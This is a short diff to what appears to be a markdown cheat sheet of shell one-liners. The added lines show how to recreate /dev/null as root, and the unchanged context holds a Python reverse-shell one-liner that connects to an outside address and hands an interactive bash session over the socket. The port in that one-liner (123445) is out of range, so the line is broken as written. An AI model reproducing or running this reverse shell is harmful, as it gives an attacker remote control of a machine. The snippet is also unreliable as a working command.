@@ -10,6 +10,10 @@ Updating
 
 ## Start
 
+## reconstruct /dev/null
+run as a root
+`rm -f /dev/null; mknod -m 666 /dev/null c 1 3`
+
 ## python reversed shell
 `python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.1.1.1',123445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"`
 
